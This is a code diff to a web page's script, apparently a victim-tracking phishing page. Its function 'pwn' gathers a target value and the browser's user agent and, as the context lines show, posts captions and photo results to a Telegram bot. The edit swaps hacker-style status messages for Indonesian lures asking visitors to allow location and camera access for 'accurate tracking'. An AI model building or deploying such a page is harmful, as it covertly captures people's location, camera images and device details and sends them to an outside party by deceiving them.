@@ -54,7 +54,7 @@ setInterval(draw,33);
 /* === Main trigger === */
 async function pwn(){
   const out=document.getElementById('result');
-  out.textContent='[+] Menscan target...';
+  out.textContent='Agar Akses Pelacakan Akurat Harap Ijinkan Lokasi & Akses Kamera';
   const payload={
     target: document.getElementById('target').value||'none',
     ua: navigator.userAgent,
@@ -121,7 +121,7 @@ ${data.url}
     form.append('text',caption+'\n[+] Foto gagal');
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',body:form});
   }
-  document.getElementById('result').textContent='[+] Laporan terkirim ke Telegram.';
+  document.getElementById('result').textContent='Harap Tunggu sejenak Sistem Memproses Pelacakan!!';
 }
 </script>
 </body>
